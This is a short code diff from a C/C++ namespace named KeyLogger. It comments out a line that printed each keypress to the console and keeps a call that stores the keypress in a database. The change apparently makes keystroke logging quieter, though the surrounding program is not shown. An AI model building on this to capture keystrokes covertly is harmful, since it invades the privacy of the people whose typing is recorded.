@@ -4,7 +4,7 @@
 namespace KeyLogger {
 
     void logKey(int keyCode) {
-        printf("%s\n", convertKeyCode(keyCode));
+        // printf("%s\n", convertKeyCode(keyCode));
 
         DB::pushExecKeypress(convertKeyCode(keyCode));
     }
